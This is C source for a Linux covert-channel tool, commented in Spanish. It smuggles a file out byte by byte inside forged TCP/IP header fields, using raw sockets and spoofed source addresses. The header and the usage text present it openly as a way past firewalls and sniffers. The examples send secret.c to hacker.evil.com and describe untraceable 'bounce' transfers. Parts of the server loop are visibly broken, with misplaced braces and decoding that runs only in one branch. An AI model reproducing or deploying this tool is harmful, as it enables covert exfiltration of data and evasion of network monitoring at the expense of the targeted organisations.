/* Covert_TCP 1.0 - Transferencia de archivos encubierta para Linux
 * Escrito por n111x (n11ixxor64@gmail.com)
 * Copyright 2024 n111x (10-16-24)
 * NO PARA USO COMERCIAL SIN PERMISO.
 *
 * Este programa manipula el encabezado TCP/IP para transferir un archivo byte por byte
 * a un host de destino. Este programa puede actuar como servidor o cliente
 * y puede usarse para ocultar la transmision de datos dentro del encabezado IP.
 * Es util para eludir firewalls desde el interior y para exportar datos con
 * paquetes que parecen inofensivos y no contienen datos evidentes para
 * que sean analizados por sniffers. En otras palabras, tecnicas de espionaje... :)
 *
 *
 * Este software debe ser usado bajo tu propio riesgo.
 *
 * Compilacion: gcc -o covert_tcp covert_tcp.c -m64
 *
 * Partes de este codigo estan basadas en ping.c (c) 1987 Regents of the
 * University of California. (Ver la funcion in_cksm())
 *
 * Pequenas porciones tomadas de varias utilidades de paquetes de autores desconocidos.
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#define VERSION "1.0"
/* Prototypes */
void forgepacket(unsigned int, unsigned int, unsigned short, unsigned 
                 short,char *,int,int,int,int); 
unsigned short in_cksum(unsigned short *, int);
unsigned int host_convert(char *);
void usage(char *);
main(int argc, char** argv)
{
    unsigned int source_host = 0, dest_host = 0;
    unsigned short source_port = 0, dest_port = 80;
    int ipid = 0, seq = 0, ack = 0, server = 0, file = 0;
    int count;
    char desthost[80], srchost[80], filename[80];

    /* Titulo */
    printf("Covert TCP %s (c)2024 n111x (n11ixxor64@gmail.com)\n", VERSION);
    printf("No para uso comercial sin permiso.\n");

    /* Verifica permisos */
    if (geteuid() != 0)
    {
        printf("\nNecesitas ser root para ejecutar esto.\n\n");
        exit(0);
    }
    /* Uso correcto del programa */
    if ((argc < 6) || (argc > 13))
    {
        usage(argv[0]);
        exit(0);
    }
    /* Sin verificacion de errores en los argumentos...proxima version :) */
    for (count = 0; count < argc; ++count)
    {
        if (strcmp(argv[count], "-dest") == 0)
        {
            dest_host = host_convert(argv[count + 1]);
            strncpy(desthost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-source") == 0)
        {
            source_host = host_convert(argv[count + 1]);
            strncpy(srchost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-file") == 0)
        {
            strncpy(filename, argv[count + 1], 79);
            file = 1;
        }
        else if (strcmp(argv[count], "-source_port") == 0)
            source_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-dest_port") == 0)
            dest_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-ipid") == 0)
            ipid = 1;
        else if (strcmp(argv[count], "-seq") == 0)
            seq = 1;
        else if (strcmp(argv[count], "-ack") == 0)
            ack = 1;
        else if (strcmp(argv[count], "-server") == 0)
            server = 1;
    }
    /* Verifica flags de codificacion */
    if (ipid + seq + ack == 0)
        ipid = 1; /* establece tipo de codificacion predeterminado si no hay ninguno */
    else if (ipid + seq + ack != 1)
    {
        printf("\n\nSolo se puede usar un flag de codificacion/decodificacion (-ipid -seq -ack) a la vez.\n\n");
        exit(1);
    }
    /* Verifica si proporcionaron un nombre de archivo */
    if (file != 1)
    {
        printf("\n\nDebes proporcionar un archivo (-file <nombre del archivo>)\n\n");
        exit(1);
    }
    if (server == 0) /* cliente */
    {
        if (source_host == 0 && dest_host == 0)
        {
            printf("\n\nDebes proporcionar una direccion de origen y destino para el modo cliente.\n\n");
            exit(1);
        }
        else if (ack == 1)
        {
            printf("\n\nLa decodificacion con -ack solo se puede usar en modo SERVIDOR (-server)\n\n");
            exit(1);
        }
        else
        {
            printf("Host de destino: %s\n", desthost);
            printf("Host de origen  : %s\n", srchost);
            if (source_port == 0)
                printf("Puerto de origen: aleatorio\n");
            else
                printf("Puerto de origen: %u\n", source_port);
            printf("Puerto de destino: %u\n", dest_port);
            printf("Archivo codificado: %s\n", filename);
            if (ipid == 1)
                printf("Tipo de codificacion: IP ID\n");
            else if (seq == 1)
                printf("Tipo de codificacion: Numero de secuencia IP\n");
            printf("\nModo cliente: Enviando datos.\n\n");
        }
    }
    else /* servidor */
    {
        if (source_host == 0 && source_port == 0)
        {
            printf("Debes proporcionar una direccion de origen y/o un puerto de origen para el modo servidor.\n");
            exit(1);
        }
        if (dest_host == 0) /* si no hay host, escucha por cualquier cosa. */
            strcpy(desthost, "Cualquier Host");
        if (source_host == 0)
            strcpy(srchost, "Cualquier Host");
        printf("Escuchando datos desde IP: %s\n", srchost);
        if (source_port == 0)
            printf("Escuchando datos para el puerto local: Cualquier Puerto\n");
        else
            printf("Escuchando datos para el puerto local: %u\n", source_port);
        printf("Archivo decodificado: %s\n", filename);
        if (ipid == 1)
            printf("Tipo de decodificacion: ID del paquete IP\n");
        else if (seq == 1)
            printf("Tipo de decodificacion: Numero de secuencia IP\n");
        else if (ack == 1)
            printf("Tipo de decodificacion: Campo ACK del paquete rebotado.\n");
        printf("\nModo servidor: Escuchando datos.\n\n");
    }
    /* Trabajo principal */
    forgepacket(source_host, dest_host, source_port, dest_port
        , filename, server, ipid, seq, ack);
    exit(0);
}
void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned
    short source_port, unsigned short dest_port, char* filename, int server, int ipid
    , int seq, int ack)
{
    struct send_tcp
    {
        struct iphdr ip;
        struct tcphdr tcp;
    } send_tcp;
    struct recv_tcp
    {
        struct iphdr ip;
        struct tcphdr tcp;
        char buffer[10000];
    } recv_pkt;
    /* Desde synhose.c por knight */
    struct pseudo_header
    {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
        struct tcphdr tcp;
    } pseudo_header;
    int ch;
    int send_socket;
    int recv_socket;
    struct sockaddr_in sin;
    FILE* input;
    FILE* output;
    /* Inicializa el RNG para su uso futuro */
    srand((getpid()) * (dest_port));
    /**********************/
    /* Codigo de cliente  */
    /**********************/
    /* Somos el cliente? */
    if (server == 0)
    {
        if ((input = fopen(filename, "rb")) == NULL)
        {
            printf("No puedo abrir el archivo %s para lectura\n", filename);
            exit(1);
        }
        else while ((ch = fgetc(input)) != EOF)
        {
            /* Bucle de retraso. Esto realmente ralentiza las cosas, pero es necesario para
            asegurar */
            /* un transporte semi-confiable de mensajes a traves de Internet y no
            inundar */
            /* conexiones de red lentas */
            /* Probablemente se deveria desarrollar una mejor */
            sleep(1);
            /* NOTA: No estoy usando las funciones de orden de bytes adecuadas para inicializar */
            /* algunos de estos valores (htons(), htonl(), etc.) y esto seguramente */
            /* causara problemas en otras arquitecturas. No me gusto hacer una traduccion directa */
            /* de ASCII a las variables porque esto se veia realmente */
            /* sospechoso al ver paquetes con numeros de secuencia de 0-255 todo el tiempo */
            /* asi que simplemente los lei en bruto y deje que la funcion los manipulase para ajustarse a sus */
            /* necesidades... CHR */
               /* Crear la cabecera IP con nuestra informacion falsificada */
            send_tcp.ip.ihl = 5;
            send_tcp.ip.version = 4;
            send_tcp.ip.tos = 0;
            send_tcp.ip.tot_len = htons(40);
            /* si NO estamos haciendo codificacion del encabezado IP ID, aleatorizamos el valor */
            /* del campo de identificacion IP */
            if (ipid == 0)
                send_tcp.ip.id = (int)(255.0 * rand() / (RAND_MAX + 1.0));
            else /* de lo contrario "codificamos" con nuestro algoritmo cursi */
                send_tcp.ip.id = ch;
            send_tcp.ip.frag_off = 0;
            send_tcp.ip.ttl = 64;
            send_tcp.ip.protocol = IPPROTO_TCP;
            send_tcp.ip.check = 0;
            send_tcp.ip.saddr = source_addr;
            send_tcp.ip.daddr = dest_addr;
            /* comenzar con la cabecera TCP falsificada */
            if (source_port == 0) /* si no proporcionaron un puerto de origen, hacemos uno */
                send_tcp.tcp.source = 1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0));
            else /* de lo contrario usamos el proporcionado */
                send_tcp.tcp.source = htons(source_port);
            if (seq == 0) /* si no estamos codificando el valor en el numero de secuencia */
                send_tcp.tcp.seq = 1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0));
            else /* de lo contrario ocultamos los datos utilizando nuestro algoritmo cursi una vez mas.
            */
                send_tcp.tcp.seq = ch;
            /* falsificar puerto de destino */
            send_tcp.tcp.dest = htons(dest_port);

            /* el resto de las banderas */
            /* NOTA: Otros canales encubiertos pueden usar las siguientes banderas para codificar datos
         un */
         /* bit a la vez. Un buen ejemplo seria el uso de la configuracion de la bandera PSH para establecerla en
      */
      /* activada o desactivada y hacer que el lado remoto decodifique los bytes en consecuencia... CHR */
            send_tcp.tcp.ack_seq = 0;
            send_tcp.tcp.res1 = 0;
            send_tcp.tcp.doff = 5;
            send_tcp.tcp.fin = 0;
            send_tcp.tcp.syn = 1;
            send_tcp.tcp.rst = 0;
            send_tcp.tcp.psh = 0;
            send_tcp.tcp.ack = 0;
            send_tcp.tcp.urg = 0;
            //   send_tcp.tcp.res2 = 0;
            send_tcp.tcp.window = htons(512);
            send_tcp.tcp.check = 0;
            send_tcp.tcp.urg_ptr = 0;

            /* Colocar nuestros datos falsificados en la estructura del socket */
            sin.sin_family = AF_INET;
            sin.sin_port = send_tcp.tcp.source;
            sin.sin_addr.s_addr = send_tcp.ip.daddr;

            /* Ahora abrimos el socket crudo para enviar */
            send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (send_socket < 0)
            {
                perror("El socket de envio no puede abrirse. ¿Eres root?");
                exit(1);
            }
            /* Hacer el checksum del encabezado IP */
            send_tcp.ip.check = in_cksum((unsigned short*)&send_tcp.ip, 20);
            /* Preparacion final del encabezado completo */
            /* Desde synhose.c por knight */
            pseudo_header.source_address = send_tcp.ip.saddr;
            pseudo_header.dest_address = send_tcp.ip.daddr;
            pseudo_header.placeholder = 0;
            pseudo_header.protocol = IPPROTO_TCP;
            pseudo_header.tcp_length = htons(20);
            bcopy((char*)&send_tcp.tcp, (char*)&pseudo_header.tcp, 20);
            /* Hacer el checksum final de todo el paquete */
            send_tcp.tcp.check = in_cksum((unsigned short*)&pseudo_header, 32);
            /* ¡Allá vamos....! */
            sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr*)&sin, sizeof(sin));
            printf("Enviando datos: %c\n", ch);
            close(send_socket);
        } /* fin del bucle while(fgetc()) */
        fclose(input);
    }/* fin del bucle if(server == 0) */
    /***********************/
    /* Codigo pasivo de servidor */
    /***********************/
    /* somos el servidor, asi que ahora escuchamos */
    else
    {
        if ((output = fopen(filename, "wb")) == NULL)
        {
            printf("No puedo abrir el archivo %s para escribir\n", filename);
            exit(1);
        }
        /* Ahora leemos del socket. Esto no es muy rapido en este momento, y tiene la misma
        */
        /* fiabilidad que UDP, ya que no confirmamos los paquetes para reintentos si son incorrectos. */
        /* Esto es solo una prueba de concepto... CHR*/
        while (1) /* bucle de lectura de paquetes */
        {
            /* Abrir socket para leer */
            recv_socket = socket(AF_INET, SOCK_RAW, 6);
            if (recv_socket < 0)
            {
                perror("El socket de recepcion no puede abrirse. ¿Eres root?");
                exit(1);
            }
            /* Escuchar el paquete de retorno en un socket pasivo */
            read(recv_socket, (struct recv_tcp*)&recv_pkt, 9999);
            /* si el paquete tiene la bandera SYN/ACK activada y es desde la direccion correcta..*/
            if (source_port == 0) /* al usuario no le importa el puerto de origen */
            {       /* comprobar si la bandera SYN/ACK esta activada y la direccion IP de origen correcta */
                if ((recv_pkt.tcp.syn == 1) && (recv_pkt.ip.saddr ==
                    source_addr))
                {
                    /* "decodificacion" del encabezado IP ID */
                    /* El numero ID se convierte de su equivalente ASCII de vuelta a
    normal */
                    if (ipid == 1)
                    {
                        printf("Recibiendo datos: %c\n", recv_pkt.ip.id);
                        fprintf(output, "%c", recv_pkt.ip.id);
                        fflush(output);
                    }
                    /* "decodificacion" del numero de secuencia IP */
                    else if (seq == 1)
                    {
                        printf("Recibiendo datos: %c\n", recv_pkt.tcp.seq);
                        fprintf(output, "%c", recv_pkt.tcp.seq);
                        fflush(output);
                    }
                    /* "decodificar" los datos en el paquete rebotado de un servidor remoto */
                    /* Esta tecnica requiere que el cliente inicie un ENVIO a */
                    /* un host remoto con una IP de origen falsificada que sea la ubicacion */
                    /* del servidor escuchante. El servidor remoto recibira el paquete */
                    /* y comenzara un ACK del paquete con el numero de secuencia codificado */
                    /* +1 de vuelta a la fuente falsificada. El servidor encubierto esta esperando en esta */
                    /* direccion falsificada y puede decodificar el campo ACK para recuperar los datos */
                    /* esto permite una transferencia de paquetes "anonima" que puede rebotar */
                    /* en cualquier sitio. Esto es MUY dificil de rastrear hasta el origen */
                    /* esto es bastante sucio en cuanto a canales encubiertos... */
                    /* Algunos enrutadores pueden no permitirte falsificar una direccion de salida */
                    /* que no esta en su red, por lo que podria no funcionar en todos los sitios... */
                    /* El ENVIADOR debe usar covert_tcp con el flag -seq y una direccion -source falsificada */
                    /* El RECEPTOR debe usar los flags -server -ipid y -seq.*/

                }/*fin if(recv_pkt)*/
            }/*fin while 1*/
            fclose(output);
        } /*fin else*/
    }/* fin de la funcion*/



/* recortado de ping.c (esta funcion es la prostituta de las rutinas de checksum */
/* Copyright (c)1987 Regents of the University of California.
* Todos los derechos reservados.
*
* La redistribucion y el uso en formas de fuente y binario estan permitidos
* siempre que el aviso de copyright anterior y este parrafo se
* dupliquen en todas esas formas y que cualquier documentacion, material
* publicitario y otros materiales relacionados con tal distribucion y uso
* reconozcan que el software fue desarrollado por la Universidad de
* California, Berkeley. El nombre de la Universidad no podra ser usado
* para respaldar o promover productos derivados de este software sin
* permiso previo y por escrito. ESTE SOFTWARE SE PROPORCIONA ``COMO
* ESTA'' Y SIN NINGUNA GARANTIA EXPRESA O IMPLICITA, INCLUYENDO,
* SIN LIMITACION, LAS GARANTIAS IMPLICITAS DE COMERCIABILIDAD Y
* ADECUACION PARA UN PROPOSITO EN PARTICULAR
*/


unsigned short in_cksum(unsigned short* ptr, int nbytes)
{
    register long           sum;            /* asume que long == 32 bits */
    u_short                 oddbyte;
    register u_short        answer;         /* asume que u_short == 16 bits */
    /*
     * Nuestro algoritmo es sencillo, usando un acumulador de 32 bits (sum),
     * sumamos secuencialmente las palabras de 16 bits a este, y al final,
     * sumamos todos los bits de acarreo de los 16 bits superiores a los 16 bits inferiores.
     */
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    /* limpiar un byte impar, si es necesario */
    if (nbytes == 1) {
        oddbyte = 0;            /* asegurarse de que la mitad superior sea cero */
        *((u_char*)&oddbyte) = *(u_char*)ptr;   /* solo un byte */
        sum += oddbyte;
    }
    /*
     * Sumar los bits de acarreo de los 16 bits superiores a los 16 bits inferiores.
     */
    sum = (sum >> 16) + (sum & 0xffff);    /* sumar los 16 bits altos a los 16 bits bajos */
    sum += (sum >> 16);                     /* sumar acarreo */
    answer = ~sum;          /* complemento a unos, luego truncar a 16 bits */
    return(answer);
} /* fin in_cksm() */



unsigned int host_convert(char* hostname)
{
    static struct in_addr i;
    struct hostent* h;
    i.s_addr = inet_addr(hostname);
    if (i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if (h == NULL)
        {
            fprintf(stderr, "no se puede resolver %s\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char*)&i.s_addr, h->h_length);
    }
    return i.s_addr;
} /* fin resolutor */


void usage(char* progname)
{
    printf("Uso de Covert TCP: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [tipo de codificacion]\n\n",
        progname);
    printf("-dest dest_ip      - Host al que se enviaran los datos.\n");
    printf("-source source_ip  - Host desde el cual se quiere que los datos\n");
    printf("                     provengan.\n");
    printf("                     En modo SERVIDOR, este es el host desde\n");
    printf("                     el cual los datos llegaran.\n");
    printf("-source_port port  - Puerto de origen que quieres que los datos\n");
    printf("                     aparezcan. (se establece aleatoriamente por defecto)\n");
    printf("-dest_port port    - Puerto de destino al que quieres que los datos\n");
    printf("                     lleguen. En modo SERVIDOR, este es el puerto\n");
    printf("                     por el cual los datos llegaran entrantes. El puerto\n");
    printf("                     80 es el valor predeterminado.\n");
    printf("-file filename     - Nombre del archivo a codificar y transferir.\n");
    printf("-server            - Modo pasivo para permitir la recepcion de datos.\n");
    printf("[Tipo de codificacion] - Tipo de codificacion opcional\n");
    printf("-ipid - Codifica los datos un byte a la vez en el ID del paquete IP.  [POR DEFECTO]\n");
    printf("-seq  - Codifica los datos un byte a la vez en el numero de secuencia del paquete.\n");
    printf("-ack  - DESCODIFICA los datos un byte a la vez desde el campo ACK.\n");
    printf("        Esto SOLO funciona en modo servidor y esta hecho para descifrar\n");
    printf("        paquetes de canal encubierto que han sido reenviados desde un\n");
    printf("        servidor remoto usando -seq. Consulta la documentacion para mas detalles.\n");
    printf("\nPresiona ENTER para ver ejemplos.");
    getchar();
    printf("\nEjemplo: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
    printf("El comando anterior envia el archivo secret.c al host hacker.evil.com\n");
    printf("un byte a la vez usando la codificacion predeterminada del ID del paquete IP.\n");
    printf("\nEjemplo: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
    printf("El comando anterior escucha pasivamente paquetes desde hacker.evil.com\n");
    printf("destinados al puerto 80. Toma los datos y guarda el archivo localmente\n");
    printf("como secret.c\n\n");
    exit(0);
} /* fin de usage() */


